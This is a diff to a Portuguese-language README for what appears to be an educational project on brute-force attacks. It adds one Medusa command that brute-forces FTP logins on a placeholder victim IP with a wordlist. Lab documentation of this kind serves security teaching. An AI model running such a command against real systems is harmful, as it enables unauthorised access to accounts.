@@ -20,5 +20,6 @@ Este projeto tem como objetivo demonstrar a execução de ataques de força brut
 ## Ataques Executados
 
 ### 1. Ataque de Força Bruta FTP com Medusa
-
+Comando:
+medusa -h [IP_VITIMA] -u ftp -P wordlists/simple.txt -M ftp
  
